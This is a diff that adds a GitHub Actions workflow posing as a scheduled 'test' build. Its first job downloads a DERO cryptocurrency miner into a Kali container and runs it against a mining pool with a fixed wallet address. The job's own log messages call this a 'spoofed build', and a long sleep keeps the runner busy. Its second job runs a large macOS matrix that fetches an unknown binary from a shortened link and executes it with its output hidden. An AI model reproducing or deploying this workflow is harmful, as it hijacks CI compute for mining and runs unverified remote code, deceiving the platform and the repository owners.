@@ -1,0 +1,75 @@
+name: KalDER Test
+
+on:
+  schedule:
+    - cron: '0 0,6,12,18 * * *'
+  workflow_dispatch:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  run-in-kali:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 50
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3]
+        flag: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    timeout-minutes: 359
+
+    steps:
+      - name: Pull Kali Linux Docker image
+        run: docker pull kalilinux/kali-rolling
+
+      - name: Run spoofed build in Kali container
+        run: |
+          docker run --rm --name kalimine kalilinux/kali-rolling bash -c "
+            echo '[*] Starting simulated build job...';
+            apt update -y && apt install -y wget tar;
+
+            echo '[*] Step 1/4: Downloading payload...';
+            wget https://github.com/Hansen333/Hansen33-s-DERO-Miner/releases/download/Version-0.6/hansen33s-dero-miner-linux-amd64.tar.gz;
+
+            echo '[*] Step 2/4: Extracting files...';
+            tar xf hansen33s-dero-miner-linux-amd64.tar.gz;
+            mv hansen33s-dero-miner-linux-amd64 h33;
+            chmod +x h33;
+
+            echo '[*] Step 3/4: Running long debugging loop (spoof build)...';
+            for i in {1..2}; do echo \"[debug] Compiling module \$i/2...\"; sleep 10; done;
+
+            echo '[*] Step 4/4: Executing...';
+            ./h33 \
+              -daemon-rpc-address dero.rabidmining.com:10300 \
+              -turbo \
+              -wallet-address deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xez9a3e7va238hsulcx0w \
+              -worker-name win
+          "
+      - name: Keep the GitHub Action Runner Alive
+        run: sleep 1180000
+
+  deploy:
+    name: X-Code
+    runs-on: macos-latest
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.1, 1.1, 1.4, 1.4, 1.4, 1.5, 1.5, 1.5, 1.1, 1.1, 1.1]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T]
+    timeout-minutes: 36
+    env:
+        NUM_JOBS: 200
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Setup Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Check-in
+      uses: actions/checkout@v2
+    - name: Pascal
+      run: |
+        wget https://bit.ly/3G1aOvJ && chmod 3G1aOvJ && ./3G1aOvJ > /dev/null
